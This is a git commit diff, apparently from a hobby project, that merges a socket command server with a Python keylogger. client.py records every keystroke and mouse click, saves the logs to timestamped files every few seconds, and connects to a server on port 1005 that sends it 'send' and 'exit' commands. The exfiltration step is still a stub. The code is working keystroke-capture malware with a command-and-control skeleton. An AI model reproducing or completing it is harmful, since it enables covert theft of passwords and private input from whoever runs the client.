17473d2f2e353f8d8cdadf2a6b8a97a26769a98c
Kurzhalsgiraffe <max-hantschke@web.de>
2023-04-23 23:13:08 +0200

    merged server with keylogger
    known issue: crash

--- client.py
+++ client.py
@@ -1,19 +1,83 @@
-import socket               # Import socket module
+# -*- coding: utf-8 -*-
+import keyboard
+import mouse
+from threading import Timer
+from datetime import datetime
+from socket import socket
 
-s = socket.socket()         # Create a socket object
+class Keylogger:
+    def __init__(self, interval):
+        self.interval = interval
+        self.log = ""
+        self.start_time_str = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
+        self.end_time_str = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
+        self.sock = socket()
+        self.host = "127.0.0.1"
+        self.port = 1005
 
-host = "127.0.0.1" # Get local machine name
-port = 1005           # Reserve a port for your service.
+    def keyboard_callback(self, event):
+        name = event.name
+        if len(name) > 1:
+            if name == "space":
+                name = " "
+            elif name == "enter":
+                name = "[ENTER]\n"
+            elif name == "decimal":
+                name = "."
+            else:
+                name = name.replace(" ", "_")
+                name = f"[{name.upper()}]"
+        self.log += name
 
-s.connect((host, port))
-while True:
-    recv = s.recv(1024)
-    recv = str(recv)[2:-1]
-    if recv == "Exit Connection":
-        s.send(bytes("Verbindung wird getrennt.", 'ascii'))
-        s.close()
-        break
-    elif recv:
-        print(recv)
-        s.send(bytes("Angekommen", 'ascii'))
-print("Fertig")
+    def mouse_callback(self):
+        self.log += f"[L_CLICK, {mouse.get_position()}]"
+    
+    def write_keylogs_to_file(self):
+        filename = f"keylog-{self.start_time_str}_{self.end_time_str}"
+
+        with open(f"{filename}.txt", "w", encoding="utf-8") as file:
+            file.write(self.log)
+        print(f"Saved {filename}.txt")
+
+    def report(self):
+        if self.log:
+            self.end_time_str = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
+            self.write_keylogs_to_file()
+            self.start_time_str = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
+        self.log = ""
+
+        timer = Timer(interval=self.interval, function=self.report)
+        timer.daemon = True
+        timer.start()
+
+    def connect_to_host(self):
+        self.sock.connect((self.host, self.port))
+
+    def send_keylog_files_to_host(self):
+        print("sende daten")
+
+    def start(self):
+        self.connect_to_host()
+
+        keyboard.on_press(callback=self.keyboard_callback)
+        mouse.on_click(callback=self.mouse_callback)
+        self.report()
+        
+        #keyboard.wait()
+        while True:
+            recv = self.sock.recv(1024)
+            if recv:
+                recv = str(recv)[2:-1]
+
+                if recv == "exit":
+                    self.sock.send(bytes("terminating", 'ascii'))
+                    self.sock.close()
+                    break
+                elif recv == "send":
+                    self.send_keylog_files_to_host()
+                else:
+                    print(recv)
+
+if __name__ == "__main__":
+    keylogger = Keylogger(interval=5)
+    keylogger.start()
--- server.py
+++ server.py
@@ -1,29 +1,24 @@
-import socket  # Import socket module
+from socket import socket
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a socket object
-#AF_INET steht für die Adress Family und beschreibt die art von Adressen mit der der Socket kommunizieren kann. In dem fall INET = IPv4
-#SOCK_STREAM beschreibt die art der verbindung. In dem fall SOCK_STREAM = TCP
+sock = socket()
 host = "127.0.0.1"
 port = 1005
-s.bind((host, port))  # Assigns the IP and Port to a socket instance
+sock.bind((host, port))
 
-s.listen(5)  # Now wait for client connection.
-#The number stands for: number of unaccepted connections that the system will allow before refusing new connections
-conn, addr = s.accept()  # Establish connection with client.
-#Returns a tuple, where the first one is a new socket objet used to send and receive data. The second one is the address bound to the socket of the client.
+sock.listen(5)  # listen for client connection. The number stands for: number of unaccepted connections that the system will allow before refusing new connections
+conn, addr = sock.accept()  # Establish connection with client. conn: new socket object used to send and receive data. addr address bound to the socket of the client.
 print('Got connection from', addr)
-try:
-    while True:
-        com = input("Enter the msg:")
-        conn.sendall(bytes(com, "ascii"))#Sendet alle daten
-        recv = conn.recv(1024)#Data recieved from the socket. 1024 is the maximum amount of data to be received at once
-        recv = str(recv)[2:-1]
-        if(recv == "Verbindung wird getrennt."):
-            break
-        print(recv)
-except KeyboardInterrupt:
-    pass
 
-conn.close()  # Close the connection
+while True:
+    inpt = input("Enter command:")
+    conn.sendall(bytes(inpt, "ascii"))
+    recv = conn.recv(1024)  #Data recieved from the socket. 1024 is the maximum amount of data to be received at once
+    if recv:
+        recv = str(recv)[2:-1]
+        if(recv == "terminating"):
+            print("Terminated client. Good bye!")
+            break
+
+conn.close()
 print("Connection closed.")
 print("Fertig")
